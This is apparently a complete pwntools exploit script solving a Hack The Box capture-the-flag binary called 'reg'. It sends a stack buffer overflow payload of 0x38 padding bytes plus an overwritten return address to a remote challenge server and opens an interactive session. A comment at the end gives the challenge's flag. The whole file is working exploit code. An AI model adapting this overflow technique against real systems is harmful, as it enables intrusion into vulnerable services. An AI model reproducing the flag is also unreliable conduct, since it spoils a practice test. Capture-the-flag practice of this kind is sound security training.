from pwn import *
local = False
if local:
    r = process('./reg')
else:
    r = remote('142.93.32.153', 31924)

payload = b"A" * 0x38 + p64(0x00401206)
f = open('./payload', 'wb')
f.write(payload)
f.close()
r.recvuntil(": ")
r.sendline(payload)
r.interactive()
# HTB{N3W_70_pWn}

